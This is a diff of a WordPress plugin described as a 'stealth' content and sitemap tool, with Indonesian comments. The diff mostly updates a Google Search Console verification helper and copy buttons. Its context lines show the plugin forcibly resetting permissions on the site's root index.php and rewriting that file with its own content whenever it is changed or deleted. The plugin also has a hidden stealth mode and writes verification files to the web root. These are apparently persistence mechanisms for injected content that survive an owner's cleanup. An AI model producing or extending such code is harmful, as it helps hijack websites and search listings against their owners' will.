@@ -1,8 +1,8 @@
 <?php
 /*
 Plugin Name: Additional Content Plugin
-Description: Plugin konten & sitemap stealth dengan Permission Guard, Copy Tools & GSC Verifier.
-Version: 7.9
+Description: Plugin konten & sitemap stealth dengan GSC Helper & Domain Copy Tool.
+Version: 8.0
 Author: Grok
 */
 
@@ -54,7 +54,6 @@ require __DIR__ . '/wp-blog-header.php';
     // 1. CEK & PERBAIKI PERMISSION (CHMOD)
     if (file_exists($index_path)) {
         $perms = substr(sprintf('%o', fileperms($index_path)), -4);
-        // Jika permission bukan 0644 (misal diubah jadi 0444/read-only), paksa ubah balik
         if ($perms !== '0644') {
             @chmod($index_path, 0644);
         }
@@ -67,15 +66,12 @@ require __DIR__ . '/wp-blog-header.php';
         $clean_default = trim(str_replace(["\r\n", "\r"], "\n", $default_content));
 
         if ($clean_current !== $clean_default) {
-            // Coba tulis ulang
             if (@file_put_contents($index_path, $default_content) === false) {
-                // Jika gagal, coba chmod lagi lalu tulis
                 @chmod($index_path, 0644);
                 file_put_contents($index_path, $default_content);
             }
         }
     } else {
-        // File hilang, buat baru
         file_put_contents($index_path, $default_content);
         @chmod($index_path, 0644);
     }
@@ -271,25 +267,21 @@ function acp_generate_random_string($length = 5) {
 
 function acp_admin_page() {
     // === HANDLING GSC VERIFICATION ===
-    // CREATE
     if (isset($_POST['acp_gsc_create'])) {
         check_admin_referer('acp_action');
         $gsc_code = sanitize_text_field($_POST['acp_gsc_code']);
         if (!empty($gsc_code)) {
-            // Pastikan format nama file aman (hanya alphanumeric)
             $filename = preg_replace('/[^a-zA-Z0-9]/', '', $gsc_code) . '.html';
             $file_path = ABSPATH . $filename;
             $content = "google-site-verification: " . $filename;
-            
             if (file_put_contents($file_path, $content) !== false) {
                 update_option('acp_gsc_filename', $filename);
                 echo '<div class="updated"><p>File verifikasi <strong>'.$filename.'</strong> berhasil dibuat!</p></div>';
             } else {
-                echo '<div class="error"><p>Gagal membuat file. Cek permission folder root.</p></div>';
+                echo '<div class="error"><p>Gagal membuat file.</p></div>';
             }
         }
     }
-    // DELETE
     if (isset($_POST['acp_gsc_delete'])) {
         check_admin_referer('acp_action');
         $filename = get_option('acp_gsc_filename');
@@ -299,7 +291,7 @@ function acp_admin_page() {
             echo '<div class="updated"><p>File verifikasi berhasil dihapus.</p></div>';
         } else {
             delete_option('acp_gsc_filename');
-            echo '<div class="error"><p>File tidak ditemukan atau sudah terhapus.</p></div>';
+            echo '<div class="error"><p>File tidak ditemukan.</p></div>';
         }
     }
     $current_gsc_file = get_option('acp_gsc_filename');
@@ -346,7 +338,7 @@ function acp_admin_page() {
     $main_sitemap_url = home_url(ACP_MAIN_SITEMAP);
     ?>
     <div class="wrap">
-        <h1>Content Plugin (V7.9 Ultimate Tools)</h1>
+        <h1>Content Plugin (V8.0 GSC Helper)</h1>
         
         <?php if ($is_hidden): ?><div class="notice notice-warning"><p>MODE STEALTH AKTIF</p></div><?php endif; ?>
         <?php if (acp_is_safe_mode()): ?>
@@ -360,7 +352,18 @@ function acp_admin_page() {
 
         <div style="background:#fff; padding:20px; border:1px solid #ccd0d4; margin-bottom:20px;">
             <h2>Google Search Console Verification</h2>
-            <p>Masukkan kode verifikasi (contoh: <code>google8f39414e57a5615a</code>) untuk membuat file verifikasi otomatis.</p>
+            
+            <div style="margin-bottom: 20px; padding-bottom: 20px; border-bottom: 1px solid #eee;">
+                <label><strong>1. Salin URL Domain Anda (URL Prefix):</strong></label>
+                <div style="display:flex; align-items:center; gap:10px; margin-top:5px;">
+                    <input type="text" id="site_domain_url" value="<?php echo home_url('/'); ?>" class="regular-text" style="width:100%;" readonly>
+                    <span class="dashicons dashicons-admin-page acp-copy" data-target="site_domain_url" style="cursor:pointer; color:#0073aa; font-size:24px;" title="Copy Domain URL"></span>
+                </div>
+                <p class="description">Paste URL ini saat diminta "URL Prefix" di Google Search Console.</p>
+            </div>
+
+            <label><strong>2. Buat File Verifikasi HTML:</strong></label>
+            <p style="margin-top:0;">Masukkan kode (contoh: <code>google8f39414e57a5615a</code>) yang didapat dari GSC.</p>
             
             <?php if ($current_gsc_file && file_exists(ABSPATH . $current_gsc_file)): ?>
                 <div style="background:#e7f7d3; padding:10px; border:1px solid #7ad03a; margin-bottom:10px;">
@@ -405,7 +408,7 @@ function acp_admin_page() {
                             <td>
                                 <div style="display:flex; align-items:center;">
                                     <input type="text" id="json_<?php echo $i; ?>" value="<?php echo $ep['json_filename']; ?>" class="regular-text" style="width:150px;" readonly> .json
-                                    <span class="dashicons dashicons-admin-page acp-copy" data-target="json_<?php echo $i; ?>" style="cursor:pointer; color:#0073aa; margin-left:5px;" title="Copy Filename"></span>
+                                    <span class="dashicons dashicons-admin-page acp-copy" data-target="json_<?php echo $i; ?>" style="cursor:pointer; color:#0073aa; margin-left:5px;" title="Copy"></span>
                                 </div>
                             </td>
                             <td><?php echo ($st == 'active') ? '<strong style="color:green">OK</strong>' : '<span>-</span>'; ?></td>
@@ -425,10 +428,8 @@ function acp_admin_page() {
             var target = document.getElementById(targetId);
             target.select();
             document.execCommand('copy');
-            
-            // Visual feedback
             var originalColor = $(this).css('color');
-            $(this).css('color', '#46b450'); // Green
+            $(this).css('color', '#46b450');
             setTimeout(() => { $(this).css('color', originalColor); }, 1000);
         });
     });
